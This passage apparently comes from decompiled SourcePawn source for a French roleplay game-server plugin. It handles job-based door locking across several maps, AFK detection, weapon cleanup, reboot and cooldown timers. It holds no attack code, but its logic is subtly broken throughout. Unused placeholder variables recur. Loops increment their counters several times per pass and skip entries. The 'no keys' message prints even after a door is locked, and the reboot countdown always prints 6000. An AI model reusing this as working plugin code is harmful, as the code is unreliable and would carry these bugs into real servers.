			}
			if (JobID[client][0][0] == 12)
			{
				if (EntHammerId == 5761)
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByHammerId(5762, ""), false);
				}
				else
				{
					if (EntHammerId == 5762)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(5761, ""), false);
					}
					if (StrEqual(entity_name, "bank_inner", true))
					{
						LockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 13)
			{
				if (EntHammerId == 269403)
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByHammerId(269408, ""), false);
				}
				else
				{
					if (EntHammerId == 269408)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(269403, ""), false);
					}
					new var71;
					if (EntHammerId == 280799)
					{
						LockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 14)
			{
				new var72;
				if (StrEqual(entity_name, "weapon_door", true))
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 15)
			{
				new var73;
				if (StrEqual(entity_name, "apt_wash1", true))
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 16)
			{
				if (StrEqual(entity_name, "groc_shop_door", true))
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 17)
			{
				if (StrEqual(entity_name, "garage_backdoor", true))
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 18)
			{
				if (EntHammerId == 5568)
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByHammerId(5565, ""), false);
					LockDoor(client, Entity_FindByHammerId(5571, ""), false);
					LockDoor(client, Entity_FindByHammerId(5574, ""), false);
				}
				else
				{
					if (EntHammerId == 5565)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(5568, ""), false);
						LockDoor(client, Entity_FindByHammerId(5571, ""), false);
						LockDoor(client, Entity_FindByHammerId(5574, ""), false);
					}
					if (EntHammerId == 5571)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(5568, ""), false);
						LockDoor(client, Entity_FindByHammerId(5565, ""), false);
						LockDoor(client, Entity_FindByHammerId(5574, ""), false);
					}
					if (EntHammerId == 5574)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(5568, ""), false);
						LockDoor(client, Entity_FindByHammerId(5565, ""), false);
						LockDoor(client, Entity_FindByHammerId(5571, ""), false);
					}
					if (EntHammerId == 5553)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(5559, ""), false);
					}
					if (EntHammerId == 5559)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(5553, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 19)
			{
				new var74;
				if (StrEqual(entity_name, "disco_door", true))
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
		}
	}
	else
	{
		if (StrEqual(mapname, "rp_california_r", true))
		{
			decl String:SteamID[64];
			GetClientAuthString(client, SteamID, 64);
			if (JobID[client][0][0] == 1)
			{
				if (StrEqual(entity_name, "City Hall Entrance Left", true))
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByName("City Hall Entrance Right", ""), false);
				}
				else
				{
					if (StrEqual(entity_name, "City Hall Entrance Right", true))
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByName("City Hall Entrance Left", ""), false);
					}
					new var75;
					if (RankID[client][0][0] == 1)
					{
						LockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			else
			{
				if (JobID[client][0][0] == 2)
				{
					if (StrEqual(entity_name, "Tenoh Office Building", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 3)
				{
					if (StrEqual(entity_name, "In-n-Out Burger Entrance L", true))
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByName("In-n-Out Burger Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "In-n-Out Burger Entrance R", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("In-n-Out Burger Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 5)
				{
					if (StrEqual(entity_name, "Shit Shack", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 6)
				{
					if (StrEqual(entity_name, "URBN Side Door", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						if (StrEqual(entity_name, "URBN Entrance Left", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("URBN Entrance Right", ""), false);
						}
						if (StrEqual(entity_name, "URBN Entrance Right", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("URBN Entrance Left", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 7)
				{
					if (StrEqual(entity_name, "Warehouse Door", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 8)
				{
					if (StrEqual(entity_name, "Sexy House Yard", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						if (StrEqual(entity_name, "Sexy House Patio", true))
						{
							LockDoor(client, Ent, true);
						}
						if (StrEqual(entity_name, "Sexy House", true))
						{
							LockDoor(client, Ent, true);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 9)
				{
					if (StrEqual(entity_name, "Oil Plant Office", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 10)
				{
					if (StrEqual(entity_name, "Verizon Entrance L", true))
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByName("Verizon Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "Verizon Entrance R", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("Verizon Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 11)
				{
					if (StrEqual(entity_name, "Tillys Entrance L", true))
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByName("Tillys Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "Tillys Entrance R", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("Tillys Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 13)
				{
					if (StrEqual(entity_name, "Stop N' Rob", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 14)
				{
					if (StrEqual(entity_name, "PacSun Entrance L", true))
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByName("PacSun Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "PacSun Entrance R", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("PacSun Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 15)
				{
					if (StrEqual(entity_name, "Store Entrance L", true))
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByName("Store Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "Store Entrance R", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("Store Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 16)
				{
					if (StrEqual(entity_name, "BP Entrance Left", true))
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByName("BP Entrance Right", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "BP Entrance Right", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("BP Entrance Left", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 17)
				{
					if (StrEqual(entity_name, "Underground Bar", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 18)
				{
					if (StrEqual(entity_name, "Maaco Side Door", true))
					{
						LockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 19)
				{
					if (StrEqual(entity_name, "Technoir Entrance L", true))
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByName("Technoir Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "Technoir Entrance R", true))
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByName("Technoir Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
			}
		}
		new var76;
		if (StrEqual(mapname, "rp_riverside_b3", true))
		{
			if (JobID[client][0][0] == 1)
			{
				if (RankID[client][0][0] != 2)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					new var77;
					if (EntHammerId == 1678093)
					{
						LockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 2)
			{
				new var78;
				if (EntHammerId == 1456616)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					new var79;
					if (EntHammerId == 1506668)
					{
						LockDoor(client, Entity_FindByHammerId(1506668, ""), true);
						LockDoor(client, Entity_FindByHammerId(1506693, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 3)
			{
				new var80;
				if (EntHammerId == 711980)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 4)
			{
				new var81;
				if (EntHammerId == 1326671)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					new var82;
					if (EntHammerId == 1326222)
					{
						LockDoor(client, Entity_FindByHammerId(1326222, ""), true);
						LockDoor(client, Entity_FindByHammerId(1326225, ""), false);
					}
					new var83;
					if (EntHammerId == 1326443)
					{
						LockDoor(client, Entity_FindByHammerId(1326443, ""), true);
						LockDoor(client, Entity_FindByHammerId(1326448, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 5)
			{
				new var84;
				if (EntHammerId == 58353)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 6)
			{
				if (EntHammerId == 138324)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 7)
			{
				new var85;
				if (EntHammerId == 89642)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 8)
			{
				new var86;
				if (EntHammerId == 1061999)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 9)
			{
				if (EntHammerId == 52536)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 10)
			{
				new var87;
				if (EntHammerId == 98488)
				{
					LockDoor(client, Entity_FindByHammerId(98488, ""), true);
					LockDoor(client, Entity_FindByHammerId(98493, ""), false);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 11)
			{
				if (EntHammerId == 51970)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 12)
			{
				new var88;
				if (EntHammerId == 82091)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 13)
			{
				new var89;
				if (EntHammerId == 455125)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 14)
			{
				new var90;
				if (EntHammerId == 622808)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 15)
			{
				if (EntHammerId == 54783)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 16)
			{
				if (EntHammerId == 52416)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 17)
			{
				if (EntHammerId == 54615)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 18)
			{
				new var91;
				if (EntHammerId == 117728)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 19)
			{
				if (EntHammerId == 29432)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					new var92;
					if (EntHammerId == 26871)
					{
						LockDoor(client, Entity_FindByHammerId(26871, ""), true);
						LockDoor(client, Entity_FindByHammerId(26876, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
		}
	}
	return 0;
}

OpenDoor(client, Ent)
{
	new EntHammerId = Entity_GetHammerId(Ent);
	decl String:mapname[128];
	GetCurrentMap(mapname, 128);
	if (StrEqual(mapname, "oviscity_r_03", true))
	{
		if (EntHammerId == 4844)
		{
			if (JobID[client][0][0] == 1)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(4834, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 4834)
		{
			if (JobID[client][0][0] == 1)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(4844, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 4299)
		{
			new var1;
			if (JobID[client][0][0] == 1)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(4297, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 4297)
		{
			new var4;
			if (JobID[client][0][0] == 1)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(4299, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 4307)
		{
			new var7;
			if (JobID[client][0][0] == 1)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(4305, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 4305)
		{
			new var10;
			if (JobID[client][0][0] == 1)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(4307, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 4174)
		{
			if (JobID[client][0][0] == 1)
			{
				new var12;
				if (RankID[client][0][0] == 1)
				{
					AcceptEntityInput(Ent, "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(4172, ""), "Toggle", client, -1, 0);
				}
			}
		}
		if (EntHammerId == 4172)
		{
			if (JobID[client][0][0] == 1)
			{
				new var13;
				if (RankID[client][0][0] == 1)
				{
					AcceptEntityInput(Ent, "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(4174, ""), "Toggle", client, -1, 0);
				}
			}
		}
		if (EntHammerId == 5568)
		{
			if (JobID[client][0][0] == 1)
			{
				new var14;
				if (RankID[client][0][0] == 1)
				{
					AcceptEntityInput(Ent, "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", client, -1, 0);
				}
			}
			if (JobID[client][0][0] == 18)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 5565)
		{
			if (JobID[client][0][0] == 1)
			{
				new var15;
				if (RankID[client][0][0] == 1)
				{
					AcceptEntityInput(Ent, "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", client, -1, 0);
				}
			}
			if (JobID[client][0][0] == 18)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 5571)
		{
			if (JobID[client][0][0] == 1)
			{
				new var16;
				if (RankID[client][0][0] == 1)
				{
					AcceptEntityInput(Ent, "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", client, -1, 0);
				}
			}
			if (JobID[client][0][0] == 18)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", client, -1, 0);
			}
		}
		if (EntHammerId == 5574)
		{
			if (JobID[client][0][0] == 1)
			{
				new var17;
				if (RankID[client][0][0] == 1)
				{
					AcceptEntityInput(Ent, "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", client, -1, 0);
					AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", client, -1, 0);
				}
			}
			if (JobID[client][0][0] == 18)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", client, -1, 0);
				AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", client, -1, 0);
			}
		}
		new var19;
		if (JobID[client][0][0] == 1)
		{
			AcceptEntityInput(Ent, "Toggle", client, -1, 0);
		}
		new var20;
		if (JobID[client][0][0] == 6)
		{
			AcceptEntityInput(Ent, "Toggle", client, -1, 0);
		}
		new var21;
		if (JobID[client][0][0] == 7)
		{
			AcceptEntityInput(Ent, "Toggle", client, -1, 0);
		}
		new var22;
		if (JobID[client][0][0] == 9)
		{
			AcceptEntityInput(Ent, "Toggle", client, -1, 0);
		}
		new var24;
		if (JobID[client][0][0] == 12)
		{
			AcceptEntityInput(Ent, "Toggle", client, -1, 0);
		}
	}
	else
	{
		new var25;
		if (StrEqual(mapname, "rp_riverside_b3", true))
		{
			new var26;
			if (JobID[client][0][0] == 7)
			{
				AcceptEntityInput(Ent, "Toggle", client, -1, 0);
			}
		}
	}
	return 0;
}

public Action:ClearWeapons(Handle:timer, param1)
{
	decl String:weapon_name[32];
	new realMaxEntities = GetMaxEntities();
	new bool:IsInSavePlace = 0;
	decl Float:Pos1[3];
	decl Float:Pos2[3];
	decl Float:Pos1_2[3];
	decl Float:Pos2_2[3];
	new i = 0;
	while (i <= realMaxEntities)
	{
		if (IsValidEntity(i))
		{
			GetEdictClassname(i, weapon_name, 32);
			if (StrContains(weapon_name, "weapon_", false) != -1)
			{
				if (Entity_GetOwner(i) == -1)
				{
					new var1;
					if (m4a1_index != i)
					{
						IsInSavePlace = 0;
						Pos1[0] = 1701.5;
						Pos1[1] = 2846.5;
						Pos1[2] = -255;
						Pos2[0] = 1476.5;
						Pos2[1] = 2641.5;
						Pos2[2] = -390.5;
						Pos1_2[0] = 3;
						Pos1_2[1] = 4354;
						Pos1_2[2] = -397;
						Pos2_2[0] = -643;
						Pos2_2[1] = 5444;
						Pos2_2[2] = -187.5;
						if (IsbetweenRect(Pos1, Pos2, i, false))
						{
							IsInSavePlace = 1;
						}
						if (IsbetweenRect(Pos1_2, Pos2_2, i, false))
						{
							IsInSavePlace = 1;
						}
						if (!IsInSavePlace)
						{
							RemoveEdict(i);
							i++;
						}
						i++;
					}
					i++;
				}
				i++;
			}
			i++;
		}
		i++;
	}
	return Action:0;
}

public Action:CloseCoffre(Handle:timer, Ent)
{
	DispatchKeyValue(Ent, "sequence", "0");
	return Action:0;
}

public Action:HEFreezeUnfreeze(Handle:timer, client)
{
	SetEntityMoveType(client, MoveType:2);
	return Action:0;
}

public Action:RemoveHEFire(Handle:timer, client)
{
	HasHEFire[client] = 0;
	return Action:0;
}

public Action:Delete(Handle:timer, entity)
{
	if (IsValidEdict(entity))
	{
		AcceptEntityInput(entity, "kill", -1, -1, 0);
	}
	return Action:0;
}

public Action:RemoveEntityTimer(Handle:Timer, entity)
{
	if (IsValidEntity(entity))
	{
		AcceptEntityInput(entity, "kill", -1, -1, 0);
	}
	return Action:4;
}

public Action:Afk_Timer(Handle:timer, client2)
{
	new client = 1;
	while (client < MaxClients)
	{
		new var1;
		if (IsClientInGame(client))
		{
			decl Float:TempVec[3];
			if (GetEntPropEnt(client, PropType:0, "m_hVehicle", 0) != -1)
			{
				GetEntPropVector(GetEntPropEnt(client, PropType:0, "m_hVehicle", 0), PropType:0, "m_vecOrigin", TempVec, 0);
			}
			else
			{
				GetEntPropVector(client, PropType:0, "m_vecOrigin", TempVec, 0);
			}
			new var2;
			if (Afk_VecPos[client][0][0][0] == TempVec[0])
			{
				if (AfkMode[client][0][0])
				{
				}
				else
				{
					decl String:AfkName[64];
					decl String:Name[64];
					PrintToChatAll("%N est maintenant absent.", client);
					PrintToChat(client, "Vous etes maintenant absent.");
					AfkMode[client] = 1;
					GetClientName(client, Name, 64);
					Format(AfkName, 64, "<AFK>%s", Name);
					SetClientName(client, AfkName);
				}
			}
			if (GetEntPropEnt(client, PropType:0, "m_hVehicle", 0) != -1)
			{
				GetEntPropVector(GetEntPropEnt(client, PropType:0, "m_hVehicle", 0), PropType:0, "m_vecOrigin", Afk_VecPos[client][0][0], 0);
				client++;
			}
			else
			{
				GetEntPropVector(client, PropType:0, "m_vecOrigin", Afk_VecPos[client][0][0], 0);
				client++;
			}
			client++;
		}
		client++;
	}
	return Action:0;
}

public Action:StopInvincibilite(Handle:timer, client)
{
	if (IsClientConnected(client))
	{
		BeInvincible[client] = 0;
		PrintToChat(client, "[L-RP] Le bonus d'invincibilite est termine.");
	}
	return Action:0;
}

public Action:UptimeTimer(Handle:timer, client)
{
	Uptime += 1;
	return Action:0;
}

public Action:CheckLicenseDB(Handle:timer, param1)
{
	CheckValidLicense();
	return Action:0;
}

public Action:ResetPlayGlace(Handle:timer, param1)
{
	if (IsClientConnected(param1))
	{
		CanPlayGlace[param1] = 1;
	}
	return Action:0;
}

public Action:ShutdownServer(Handle:timer, param1)
{
	RebootTimer = RebootTimer + -1;
	PrintToChatAll("[L-RP] Redemarrage du serveur dans %i secondes.", 6000);
	if (0 >= RebootTimer)
	{
		PrintToChatAll("[L-RP] Redemarrage en cours...");
		ServerCommand("exit");
	}
	return Action:0;
}

public Action:RechargeTazer(Handle:timer, param1)
{
	new var1;
	if (IsClientConnected(param1))
	{
		CanUseTazer[param1] = 1;
	}
	return Action:0;
}

public Action:CoolDownVol(Handle:timer, param1)
{
	new var1;
	if (IsClientConnected(param1))
	{
		CanVol[param1] = 0;
	}
	return Action:0;
}

public Action:CoolDownPick(Handle:timer, param1)
{
	new var1;
	if (IsClientConnected(param1))
	{
		CanPick[param1] = 0;
	}
	return Action:0;
}

public Action:BarTime_CreateKit(Handle:timer, param1)
{
	new var1;
	if (IsClientInGame(param1))
	{
		SetEntPropFloat(param1, PropType:0, "m_flProgressBarStartTime", GetGameTime(), 0);
		SetEntProp(param1, PropType:0, "m_iProgressBarDuration", any:0, 4, 0);
		SetEntityRenderColor(param1, 255, 255, 255, 255);
		IsCrochette[param1] = 0;
		if (GetEntityMoveType(param1))
		{
		}
		else
		{
			SetEntityMoveType(param1, MoveType:2);
			if (KitCrochettage[param1][0][0] < 20)
			{
				new var2 = KitCrochettage[param1];
				var2 = var2[0][0] + 1;
				PrintToChat(param1, "[L-RP] Vous avez fabriquer un Kit de Crochetage.");
			}
			PrintToChat(param1, "[L-RP] Vous avez atteint la limite maximum de 20 kits.");
		}
	}
	return Action:0;
}

public Action:ResetSpeed(Handle:timer, param1)
{
	new var1;
	if (IsClientInGame(param1))
	{
		SetEntPropFloat(param1, PropType:1, "m_flLaggedMovementValue", 1, 0);
	}
	return Action:0;
}

public Action:ResetGrav(Handle:timer, param1)
{
	new var1;
	if (IsClientInGame(param1))
	{
		SetEntityGravity(param1, 1);
	}
	return Action:0;
}

public Action:RemoveDeathWeapon(Handle:timer, weapon)
{
	new var1;
	if (weapon)
	{
		if (GetEntDataEnt2(weapon, g_weaponHasOwner) == -1)
		{
			RemoveEdict(weapon);
		}
	}
	return Action:0;
}

public Action:Timer_DissolveRagdoll(Handle:timer, client)
{
	new var1;
	if (ragdoll[client][0][0] > 0)
	{
		AcceptEntityInput(ragdoll[client][0][0], "kill", -1, -1, 0);
	}
	return Action:0;
}

public Action:SpawnInfiniteM4a1(Handle:timer, param1)
{
	decl Float:absOrigin[3];
	absOrigin[0] = -3017.5;
	absOrigin[1] = -2177.5;
	absOrigin[2] = -224.65;
	decl Float:absAngles[3];
	absAngles[0] = 0.678479;
	absAngles[1] = 36.86183;
	absAngles[2] = 89.00618;
	TeleportEntity(m4a1_index, absOrigin, absAngles, NULL_VECTOR);
	SetEntityMoveType(m4a1_index, MoveType:0);
	return Action:0;
}

public Action:SpawnInfiniteFiveSeven(Handle:timer, param1)
{
	decl Float:absOrigin[3];
	absOrigin[0] = -2981.577;
	absOrigin[1] = -2156.934;
	absOrigin[2] = -226.7119;
	decl Float:absAngles[3];
	absAngles[0] = 0.678479;
	absAngles[1] = 36.86183;
	absAngles[2] = 89.00618;
	TeleportEntity(fiveseven_index, absOrigin, absAngles, NULL_VECTOR);
	SetEntityMoveType(fiveseven_index, MoveType:0);
	return Action:0;
}

public Action:SpawnInfiniteUsp(Handle:timer, param1)
{
	decl Float:absOrigin[3];
	absOrigin[0] = -2713.877;
	absOrigin[1] = -807.0549;
	absOrigin[2] = -347.7736;
	decl Float:absAngles[3];
	absAngles[0] = -0.759209;
	absAngles[1] = 60.49665;
	absAngles[2] = 90.97755;
	TeleportEntity(usp_index, absOrigin, absAngles, NULL_VECTOR);
	SetEntityMoveType(usp_index, MoveType:0);
	return Action:0;
}

public Action:SpawnInfiniteM3(Handle:timer, param1)
{
